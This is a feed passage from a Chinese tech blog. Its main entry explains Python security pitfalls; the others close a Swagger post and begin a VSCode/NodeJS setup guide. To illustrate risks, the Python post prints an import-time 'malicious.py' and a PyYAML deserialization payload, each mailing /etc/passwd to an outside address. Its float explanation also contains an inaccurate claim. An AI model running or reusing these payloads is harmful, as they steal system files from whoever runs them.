<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">➜  Downloads ls asiidoc</div><div class="line">Fonts  swagger.adoc themes</div><div class="line">docker run --rm -v $(<span class="built_in">pwd</span>)/asiidoc/:/document/ madduci/docker-asciidoctor-pdf  <span class="_">-a</span> pdf-fontsdir=/document/Fonts <span class="_">-a</span> pdf-stylesdir=/document/themes /document/swagger.adoc</div></pre></td></tr></table></figure>
<p>最后查看asiidoc下面就会有生成的pdf文件</p>
</li>
</ul>
<h2 id="代码生成器-codegen"><a href="#代码生成器-codegen" class="headerlink" title="代码生成器(codegen)"></a>代码生成器(codegen)</h2><p>swagger能提供服务端和客户端的代码生成功能,这个功能在swagger-editor上已经集成<br>生成server端代码：<br><img src="http://oiw1gzfww.bkt.clouddn.com/swagger_gen_server_code.png" alt=""><br>生成客户端代码：<br><img src="http://oiw1gzfww.bkt.clouddn.com/swagger_gen_client_code.png" alt=""></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;http://oiw1gzfww.bkt.clouddn.com/swagger_example.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;
    
    </summary>
    
      <category term="程序设计" scheme="https://blog.yumaojun.net/categories/%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1/"/>
    
      <category term="RESTful API" scheme="https://blog.yumaojun.net/categories/%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1/RESTful-API/"/>
    
    
      <category term="swagger" scheme="https://blog.yumaojun.net/tags/swagger/"/>
    
  </entry>
  
  <entry>
    <title>使用Python中的一些安全建议</title>
    <link href="https://blog.yumaojun.net/2017/01/02/python-bestpractice/"/>
    <id>https://blog.yumaojun.net/2017/01/02/python-bestpractice/</id>
    <published>2017-01-02T04:46:29.000Z</published>
    <updated>2017-01-10T05:56:00.000Z</updated>
    
    <content type="html"><![CDATA[<p><img src="http://oiw1gzfww.bkt.clouddn.com/python_tips_.png" alt=""><br><a id="more"></a></p>
<p>由于Python简洁，优雅，开发效率高，渐渐在计算环境中无处不在。但是如果你不注意，容易编写出具有严重安全隐患的代码, 以下我整理的一些如何编写出安全代码的一些建议。</p>
<h2 id="input函数"><a href="#input函数" class="headerlink" title="input函数"></a>input函数</h2><p>在<code>Python 2</code>大量的内置功能集合中，<code>input</code>完全就是一个安全灾难。一旦调用它，从标准输入读入的任何东西都会被立即解析为Python代码：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">➜  ~ python2</div><div class="line">Python 2.7.12 (default, Dec  2 2016, 21:51:52)</div><div class="line">[GCC 4.2.1 Compatible Apple LLVM 8.0.0 (clang-800.0.42.1)] on darwin</div><div class="line">Type <span class="string">"help"</span>, <span class="string">"copyright"</span>, <span class="string">"credits"</span> or <span class="string">"license"</span> <span class="keyword">for</span> more information.</div><div class="line">&gt;&gt;&gt; input()</div><div class="line">dir()</div><div class="line">[<span class="string">'__builtins__'</span>, <span class="string">'__doc__'</span>, <span class="string">'__name__'</span>, <span class="string">'__package__'</span>]</div><div class="line">&gt;&gt;&gt; input()</div><div class="line">__import__(<span class="string">'sys'</span>).exit()</div><div class="line">➜  ~</div></pre></td></tr></table></figure></p>
<p>显然，必须永远不使用<code>input</code>函数，除非脚本的标准输入中的数据是完全可信的。 <code>Python 2</code>文档建议将<code>raw_input</code>作为一个安全的替代品。在<code>Python 3</code>中，<code>input</code>函数等同于<code>raw_input</code>，从而一劳永逸地解决了这个隐患</p>
<h2 id="assert语句"><a href="#assert语句" class="headerlink" title="assert语句"></a>assert语句</h2><p>在 Python 应用中使用 assert 语句在不可能条件下捕获是一个编程习惯。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">verify_credentials</span><span class="params">(username, password)</span>:</span></div><div class="line">    <span class="keyword">assert</span> username <span class="keyword">and</span> password, <span class="string">'Credentials not supplied by caller'</span></div><div class="line">    ... authenticate possibly null user <span class="keyword">with</span> null password ...</div></pre></td></tr></table></figure></p>
<p>然而，在将源代码编译成优化的字节码时（例如， python - O ），Python 并不为 assert 语句生成任何指令。它默默地删除那些程序员写的让程序免受畸形数据攻击的代码，让应用暴露在攻击之中。该漏洞的根本原因在于 assert机制纯粹是为测试目的而设，正如在 C++ 中做的那样。程序员必须使用其他手段以保证数据一致性。</p>
<h2 id="不要使用is来比较int"><a href="#不要使用is来比较int" class="headerlink" title="不要使用is来比较int"></a>不要使用is来比较int</h2><p>在我们的印象里，int是不可变对象，我们来看看下面这个例子<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>a = <span class="number">257</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>b = <span class="number">257</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>a <span class="keyword">is</span> b</div><div class="line"><span class="keyword">False</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>a == b</div><div class="line"><span class="keyword">True</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>a = <span class="number">256</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>b = <span class="number">256</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>a <span class="keyword">is</span> b</div><div class="line"><span class="keyword">True</span></div></pre></td></tr></table></figure></p>
<p>为了避免每次给经常使用到这部分整数分配一个新的内存，<code>Python</code>预先生成并缓存好这些常用整数(<code>[-5, 257)</code>)，这样的预处理可以加快程序运行时效率，更详细的了解会在以后的Python数据结构源码解读部分做介绍。<br>因此不要使用is比较整数大小，is是用于比较是否为同一对象的，is本身是不是用来干这件事的。</p>
<h2 id="float的舍入问题"><a href="#float的舍入问题" class="headerlink" title="float的舍入问题"></a>float的舍入问题</h2><p>因为十进制的小数并不能用二进制精确的表达出来, 在十进制中，进制的基数是10，而5正好是10的一半。 2的一半是多少？当然是1了。 所以，十进制的0.5就是二进制的0.1, 而对于二进制来说，只有0和1的变化，那么只有0.1和0.0,这样仅能精确表达十进制0.0和0.5,你以此类推，那么会发现一个结论：如果一个十进制数可以用二进制精确表示，那么它的最后一位肯定是5,所以只有以5结尾的小数才能被精确的计算<br>我们看看下面一个有趣的现象。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line">In [<span class="number">1</span>]: <span class="number">0.1</span> + <span class="number">0.1</span></div><div class="line">Out[<span class="number">1</span>]: <span class="number">0.2</span></div><div class="line"></div><div class="line">In [<span class="number">2</span>]: <span class="number">0.1</span> + <span class="number">0.1</span> + <span class="number">0.1</span></div><div class="line">Out[<span class="number">2</span>]: <span class="number">0.30000000000000004</span></div><div class="line"></div><div class="line">In [<span class="number">3</span>]: <span class="number">0.1</span> + <span class="number">0.1</span> + <span class="number">0.1</span> + <span class="number">0.1</span></div><div class="line">Out[<span class="number">3</span>]: <span class="number">0.4</span></div><div class="line"></div><div class="line">In [<span class="number">4</span>]: <span class="number">0.1</span> + <span class="number">0.1</span> + <span class="number">0.1</span> + <span class="number">0.1</span> + <span class="number">0.1</span></div><div class="line">Out[<span class="number">4</span>]: <span class="number">0.5</span></div><div class="line"></div><div class="line">In [<span class="number">5</span>]: <span class="number">0.1</span> + <span class="number">0.1</span> + <span class="number">0.1</span> + <span class="number">0.1</span> + <span class="number">0.1</span> + <span class="number">0.1</span></div><div class="line">Out[<span class="number">5</span>]: <span class="number">0.6</span></div><div class="line"></div><div class="line">In [<span class="number">6</span>]: <span class="number">0.1</span> + <span class="number">0.1</span> + <span class="number">0.1</span> + <span class="number">0.1</span> + <span class="number">0.1</span> + <span class="number">0.1</span> + <span class="number">0.1</span></div><div class="line">Out[<span class="number">6</span>]: <span class="number">0.7</span></div><div class="line"></div><div class="line">In [<span class="number">7</span>]: <span class="number">0.1</span> + <span class="number">0.1</span> + <span class="number">0.1</span> + <span class="number">0.1</span> + <span class="number">0.1</span> + <span class="number">0.1</span> + <span class="number">0.1</span> + <span class="number">0.1</span></div><div class="line">Out[<span class="number">7</span>]: <span class="number">0.7999999999999999</span></div><div class="line"></div><div class="line">In [<span class="number">8</span>]: <span class="number">0.1</span> + <span class="number">0.1</span> + <span class="number">0.1</span> + <span class="number">0.1</span> + <span class="number">0.1</span> + <span class="number">0.1</span> + <span class="number">0.1</span> + <span class="number">0.1</span> + <span class="number">0.1</span></div><div class="line">Out[<span class="number">8</span>]: <span class="number">0.8999999999999999</span></div><div class="line"></div><div class="line">In [<span class="number">9</span>]: <span class="number">0.1</span> + <span class="number">0.1</span> + <span class="number">0.1</span> + <span class="number">0.1</span> + <span class="number">0.1</span> + <span class="number">0.1</span> + <span class="number">0.1</span> + <span class="number">0.1</span> + <span class="number">0.1</span> + <span class="number">0.1</span></div><div class="line">Out[<span class="number">9</span>]: <span class="number">0.9999999999999999</span></div></pre></td></tr></table></figure></p>
<p>我看到有位网友的提出的解决方案：</p>
<blockquote>
<p>我有一个观点，针对小数精度不够的问题（例如 0.1），软件可以人为的在数据最后一位补 5， 也就是 0.15，这样牺牲一位，但是可以保证数据精度，还原再把那个尾巴 5 去掉。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">In [<span class="number">40</span>]: <span class="number">0.4</span> + <span class="number">0.2</span></div><div class="line">Out[<span class="number">40</span>]: <span class="number">0.6000000000000001</span></div><div class="line"></div><div class="line">In [<span class="number">41</span>]: (<span class="number">0.45</span> + <span class="number">0.25</span>) - (<span class="number">0.05</span> + <span class="number">0.05</span>)</div><div class="line">Out[<span class="number">41</span>]: <span class="number">0.</span></div><div class="line"></div><div class="line">In [<span class="number">49</span>]: <span class="number">0.6</span> + <span class="number">0.3</span></div><div class="line">Out[<span class="number">49</span>]: <span class="number">0.8999999999999999</span></div><div class="line"></div><div class="line">In [<span class="number">50</span>]: <span class="number">0.65</span> + <span class="number">0.35</span> - (<span class="number">0.05</span> + <span class="number">0.05</span>)</div><div class="line">Out[<span class="number">50</span>]: <span class="number">0.9</span></div></pre></td></tr></table></figure></p>
</blockquote>
<p>最好的处理措施是只要有可能，就坚持整数运算。次好的处理措施可能是使用decimal模块，它试图保护用户免受琐碎细节和危险缺陷之苦。</p>
<h2 id="私有属性"><a href="#私有属性" class="headerlink" title="私有属性"></a>私有属性</h2><p>Python 不支持对象属性隐藏, 及时你使用__来保护你的变量(private),在内部，python也仅仅是将其别名了而已，而这个别名的动作是在解释器调用type来创建class时执行的的。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line">In [<span class="number">54</span>]: <span class="class"><span class="keyword">class</span> <span class="title">X</span><span class="params">(object)</span>:</span></div><div class="line">    ...:     <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></div><div class="line">    ...:         self.__private = <span class="number">1</span></div><div class="line">    ...:     <span class="function"><span class="keyword">def</span> <span class="title">get_private</span><span class="params">(self)</span>:</span></div><div class="line">    ...:         <span class="keyword">return</span> self.__private</div><div class="line">    ...:     <span class="function"><span class="keyword">def</span> <span class="title">has_private</span><span class="params">(self)</span>:</span></div><div class="line">    ...:         <span class="keyword">return</span> hasattr(self, <span class="string">'__private'</span>)</div><div class="line">    ...:</div><div class="line"></div><div class="line">In [<span class="number">55</span>]: x = X()</div><div class="line"></div><div class="line">In [<span class="number">56</span>]: x.has_private()</div><div class="line">Out[<span class="number">56</span>]: <span class="keyword">False</span></div><div class="line"></div><div class="line">In [<span class="number">57</span>]: x.get_private()</div><div class="line">Out[<span class="number">57</span>]: <span class="number">1</span></div><div class="line"></div><div class="line">In [<span class="number">58</span>]: x.__private = <span class="number">2</span></div><div class="line"></div><div class="line">In [<span class="number">59</span>]: x.__private</div><div class="line">Out[<span class="number">59</span>]: <span class="number">2</span></div><div class="line"></div><div class="line">In [<span class="number">60</span>]: hasattr(x, <span class="string">'__private'</span>)</div><div class="line">Out[<span class="number">60</span>]: <span class="keyword">True</span></div><div class="line"></div><div class="line">In [<span class="number">61</span>]: x._X__private</div><div class="line">Out[<span class="number">61</span>]: <span class="number">1</span></div></pre></td></tr></table></figure></p>
<p>然后如果我们后面动态添加的属性，那么是不会有这种保护的(无转换发生)<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">In [<span class="number">62</span>]: x.__private</div><div class="line">Out[<span class="number">62</span>]: <span class="number">2</span></div><div class="line"></div><div class="line">In [<span class="number">63</span>]: hasattr(x, <span class="string">'__private'</span>)</div><div class="line">Out[<span class="number">63</span>]: <span class="keyword">True</span></div></pre></td></tr></table></figure></p>
<p>如果程序员依赖于双下划线属性来在他们的代码中做出重要决定，而不关注私有属性的不对称行为，那么这些小技巧会变成安全漏洞</p>
<h2 id="模块执行"><a href="#模块执行" class="headerlink" title="模块执行"></a>模块执行</h2><p>语句实际上会导致导入的模块中的代码的执行，这一事实并不明显。这就是为什么甚至导入不可信模块或包是有风险的。导入像这样的简单模块可能会导致不愉快的结果：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">$ cat malicious.py</div><div class="line"><span class="keyword">import</span> os</div><div class="line"><span class="keyword">import</span> sys</div><div class="line">os.system(<span class="string">'cat /etc/passwd | mail attacker@blackhat.com'</span>)</div><div class="line"><span class="keyword">del</span> sys.modules[<span class="string">'malicious'</span>]  <span class="comment"># pretend it's not imported</span></div><div class="line">$ python</div><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> malicious</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>dir(malicious)</div><div class="line">Traceback(most recent call last):</div><div class="line">NameError:</div><div class="line">    name <span class="string">'malicious'</span> <span class="keyword">is</span> <span class="keyword">not</span> defined</div></pre></td></tr></table></figure></p>
<h2 id="猴子补丁"><a href="#猴子补丁" class="headerlink" title="猴子补丁"></a>猴子补丁</h2><p>运行时修改 Python 对象属性的过程称之为猴子补丁 ( monkey patching)。作为动态语言， Python 完全支持运行时程序自省和代码突变。一旦以某种方式导入了一个恶意模块，那么任何现有的可变对象可被不知不觉地在没有程序员同意的情况下被打猴子补丁。<br>攻击者可以利用 Python 垃圾回收器 ( gc.get_objects())来掌握现有的所有对象，并黑进它们中任意一个。</p>
<p>Python 对象的类型是由 __class__ 属性决定的。邪恶的攻击者可以通过依靠改变活动对象的类型来令人绝望地把事情搞砸：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="class"><span class="keyword">class</span> <span class="title">X</span><span class="params">(object)</span>:</span></div><div class="line">        <span class="keyword">pass</span></div><div class="line">...</div><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="class"><span class="keyword">class</span> <span class="title">Y</span><span class="params">(object)</span>:</span></div><div class="line">        <span class="keyword">pass</span></div><div class="line">...</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>x_obj = X()</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>x_obj</div><div class="line">&lt;__main__.X object at <span class="number">0x7f62dbe5e010</span> &gt;</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>isinstance(x_obj, X)</div><div class="line"><span class="keyword">True</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>x_obj.__class__ = Y</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>x_obj</div><div class="line">&lt;__main__.Y object at <span class="number">0x7f62dbe5d350</span> &gt;</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>isinstance(x_obj, X)</div><div class="line"><span class="keyword">False</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>isinstance(x_obj, Y)</div><div class="line"><span class="keyword">True</span></div><div class="line">&gt;&gt;&gt;</div></pre></td></tr></table></figure></p>
<p>对抗恶意猴子补丁的唯一处理措施是保证导入的 Python 模块的真实性和完整性, 一个简单的方法是使用__slot__来保护自己的类不被注入攻击,但是这又丧失了一些灵活性。</p>
<h2 id="通过subprocess进行shell注入"><a href="#通过subprocess进行shell注入" class="headerlink" title="通过subprocess进行shell注入"></a>通过subprocess进行shell注入</h2><p>以胶水语言著称，对Python脚本来说，通过让操作系统来执行它们，可能还提供额外的参数，来委派系统管理任务给其他程序，是非常常见的。subprocess模块为这样的任务提供了易于使用和相当高层次的服务。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> subprocess <span class="keyword">import</span> call</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>call(<span class="string">'date'</span>)</div><div class="line"><span class="number">2017</span>年 <span class="number">1</span>月<span class="number">10</span>日 星期二 <span class="number">13</span>时<span class="number">11</span>分<span class="number">53</span>秒 CST</div><div class="line"><span class="number">0</span></div><div class="line">&gt;&gt;&gt;</div></pre></td></tr></table></figure></p>
<p>但有一个陷阱！要利用<code>UNIX shell</code>服务，例如命令行参数扩展，call函数的<code>shell</code>关键字参数应该设置为<code>True</code>。然后原样传递call函数的第一个参数给系统<code>shell</code>，用以进一步的解析。一旦无效的用户输入到达call函数(或者其他在 subprocess 模块中实现的函数)，那么就会开放一个口给底层系统资源。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>call(<span class="string">'cut -d: -f1 /etc/passwd'</span>, shell=<span class="keyword">True</span>)</div><div class="line">nobody</div><div class="line">root</div><div class="line">daemon</div><div class="line">...</div></pre></td></tr></table></figure></p>
<p>显然，将<code>shell</code>关键字保持默认值<code>False</code>，并且提供命令及其参数的数组给<code>subprocess</code>函数，不要为外部命令执行调用<code>UNIX shell</code>，这样会安全得多。在这第二次调用格式，命令或者它的参数都不会被<code>shell</code>解析或展开。<br>如果应用的本质决定了使用<code>UNIX shell</code>服务，那么清理一切到 <code>subprocess</code>的参数，确保没有不想要的shell功能可以被恶意用户利用，这完全是重要的。在更新的Python版本中，可以用标准库的<code>shlex.quote</code>函数来进行shell转义。</p>
<h2 id="序列化-pyYAML"><a href="#序列化-pyYAML" class="headerlink" title="序列化-pyYAML"></a>序列化-pyYAML</h2><p>作为一个流行的配置文件格式，<code>YAML</code>不一定被认为是一个能够诱使反序列化器执行任意代码的强大的序列化协议。让它甚至更危险的是，事实上<code>Python</code>的<code>YAML</code>默认实现—-<code>PyYAML</code>让反序列化看起来非常无辜：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>dangerous_input = <span class="string">"""</span></div><div class="line"><span class="meta">... </span>some_option: !!python/object/apply:subprocess.call</div><div class="line"><span class="meta">... </span>  args: [cat /etc/passwd | mail 719118794@qq.com]</div><div class="line"><span class="meta">... </span>  kwds: &#123;shell: true&#125;</div><div class="line"><span class="meta">... </span>"""</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>yaml.load(dangerous_input)</div><div class="line">&#123;<span class="string">'some_option'</span>: <span class="number">0</span>&#125;</div></pre></td></tr></table></figure></p>
<p>而/etc/passwd已经被窃取了。一个建议的解决方法是总是使用 yaml.safe_load来处理那些你不信任的YAML序列化。尽管如此，目前的PyYAML默认感觉有些驱使人考虑其他倾向于为相似的目的使用 dump/ load函数名（但是以一种安全的方式的序列化库</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;http://oiw1gzfww.bkt.clouddn.com/python_tips_.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;
    
    </summary>
    
      <category term="开发语言" scheme="https://blog.yumaojun.net/categories/%E5%BC%80%E5%8F%91%E8%AF%AD%E8%A8%80/"/>
    
      <category term="Python" scheme="https://blog.yumaojun.net/categories/%E5%BC%80%E5%8F%91%E8%AF%AD%E8%A8%80/Python/"/>
    
    
      <category term="python_tips" scheme="https://blog.yumaojun.net/tags/python-tips/"/>
    
  </entry>
  
  <entry>
    <title>使用VSCode快速搭建NodeJS开发环境</title>
    <link href="https://blog.yumaojun.net/2017/01/01/nodejs-vscode/"/>
    <id>https://blog.yumaojun.net/2017/01/01/nodejs-vscode/</id>
    <published>2017-01-01T14:42:02.000Z</published>
    <updated>2017-01-06T06:18:03.000Z</updated>
    
    <content type="html"><![CDATA[<p>文本的目的是快速搭建NodeJS的开发环境，NodeJS的常见的开发方式有2种，一种是编辑器，一种是IDE。编辑器推荐使用微软出品的vscdoe，因为其启动速度快，轻量级，执行简单，调试方便，还有界面漂亮。而IDE 无可厚非的就是WebStorm了。这里使用vscdoe搭建开发环境，因为IDE真的比较耗内存。除非开发大型项目,否则轻易我不开IDE。<br><a id="more"></a></p>
<h2 id="VSCode简介"><a href="#VSCode简介" class="headerlink" title="VSCode简介"></a>VSCode简介</h2><p>VSCode全称是Visual Studio Code, 由微软出品,但它不是那个大块头的Visual Studio ,它是一个精简版的迷你Visual Studio，并且，Visual Studio Code可以跨！平！台！Windows、Mac和Linux通用。</p>
<h2 id="安装VSCode"><a href="#安装VSCode" class="headerlink" title="安装VSCode"></a>安装VSCode</h2><p>可以通过<a href="https://code.visualstudio.com/Download" target="_blank" rel="external">官方下载</a>, 由于你我都懂的原因，可能无法访问，因此你可能会需要使用<a href="https://pan.baidu.com/s/1kU5OCOB#list/path=%2Fpub%2Fvscode" target="_blank" rel="external">国内镜像</a>,直接下mac版本的安装包，安装。</p>
<h2 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h2><p>在VS Code中，我们可以非常方便地运行JavaScript文件。</p>
<p>VS Code以文件夹作为工程目录（Workspace Dir），所有的JavaScript文件都存放在该目录下。此外，VS Code在工程目录下还需要一个.vscode的配置目录，里面存放里VS Code需要的配置文件。</p>
<p>假设我们要创建一个hello的工程，因此我需要一个hello的目录作为工程目录，然后在里面编写hello.js文件，则该工程目录的结构如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">hello/ &lt;-- workspace dir</div><div class="line">|</div><div class="line">+- hello.js &lt;-- JavaScript file</div><div class="line">|</div><div class="line">+- .vscode/  &lt;-- VS Code config</div><div class="line">   |</div><div class="line">   +- launch.json &lt;-- VS Code config file <span class="keyword">for</span> JavaScript</div></pre></td></tr></table></figure></p>
<p>然后切换到debug模式进行运行，关于debug模式后面介绍。对于更细节相关的文档可以参考微软官方提供的<a href="https://code.visualstudio.com/Docs/languages/javascript" target="_blank" rel="external">JavaScript in VS Code</a></p>
<h2 id="智能提示"><a href="#智能提示" class="headerlink" title="智能提示"></a>智能提示</h2><p>因为之前微软推出了<code>typescript</code>语言，结合tsd文件，用visual studio写typescript代码是相当爽的，智能提示的功能非常nb。</p>
<p>这个功能理所应当也被<code>vscode</code>继承了，但是现在<a href="https://github.com/DefinitelyTyped/tsd" target="_blank" rel="external">tsd</a>项目已经过期了，接过这个接力棒的是<a href="https://github.com/typings/typings" target="_blank" rel="external">typings</a></p>
<p>因此我们将通过Typings来实现JavaScript智能提示功</p>
<h3 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h3><blockquote>
<p>安装NPM</p>
</blockquote>
<p><code>NPM</code>是和<code>Node.js</code>一起安装的，如果你想使用NPM的话，那么你应该先安装<code>Node.js</code></p>
<blockquote>
<p>Typings vs TSD</p>
</blockquote>
<p><code>Typings</code>作为<code>TSD</code>的替代者而出现的，如果你已经安装了TSD，那么需要知道现在TSD已经不推荐使用了。如果已经安装TSD请执行下面的命令来移除它<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">npm rm -g tsd</div></pre></td></tr></table></figure></p>
<blockquote>
<p>CNPM</p>
</blockquote>
<p>在国内由于墙的原因，大部分时候使用NPM安装模块的速度上会很慢，这时候我们其实可以选择国内淘宝的<code>NPM镜像</code>，关于淘宝NPM镜像的使用方法可以参考<a href="https://npm.taobao.org/" target="_blank" rel="external">淘宝 NPM 镜像</a></p>
<p>使用下面的命令来进行安装和使用<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">npm install -g cnpm --registry=https://registry.npm.taobao.org</div><div class="line">cnpm install koa</div></pre></td></tr></table></figure></p>
<h3 id="安装Typings"><a href="#安装Typings" class="headerlink" title="安装Typings"></a>安装Typings</h3><p>我们通过cnpm来安装typings<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">maojun@maojun-mbp$ npm install -g typings</div><div class="line"></div><div class="line">maojun@maojun-mbp$ typings -v</div><div class="line">2.0.0</div></pre></td></tr></table></figure></p>
<h3 id="配置智能提示"><a href="#配置智能提示" class="headerlink" title="配置智能提示"></a>配置智能提示</h3><p>安装完成后，我们需要安装相应的需要提示功能库或者框架的类型信息文件，在这里我们新建一个文件夹 NodeSnippet，为了了解Typings的使用方法，你可能需要简单看看<a href="https://github.com/typings/typings" target="_blank" rel="external">typings github</a></p>
<p>使用命令行进入到该目录中，分别输入下面两个命令来安装Node和Lodash的类型接口信息文件：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">typings install dt~node --global --save</div><div class="line">typings install lodash --save</div></pre></td></tr></table></figure></p>
<p>这时候我们可以看到我们的 NodeSnippet目录中多了一些文件：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"> maojun@maojun-mbp$ tree .</div><div class="line">.</div><div class="line">├── typings</div><div class="line">│   ├── globals</div><div class="line">│   │   └── node</div><div class="line">│   │       ├── index.d.ts</div><div class="line">│   │       └── typings.json</div><div class="line">│   ├── index.d.ts</div><div class="line">│   └── modules</div><div class="line">│       └── lodash</div><div class="line">│           ├── index.d.ts</div><div class="line">│           └── typings.json</div><div class="line">└── typings.json</div></pre></td></tr></table></figure></p>
<p>这些文件就是为我们提供提示信息的类型类型文件(使用TypeScript定义)。查看Typings是否支持某个库或框架的智能提示，我们可以使用下面的命令:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">typings search exampleName</div></pre></td></tr></table></figure></p>
<h3 id="启动智能提示"><a href="#启动智能提示" class="headerlink" title="启动智能提示"></a>启动智能提示</h3><p>配置好了类型接口后，可以通过两种方式来启动提示功能：</p>
<ol>
<li><p>文件头加注释</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/// &lt;reference path="./typings/index.d.ts" /&gt;</span></div></pre></td></tr></table></figure>
</li>
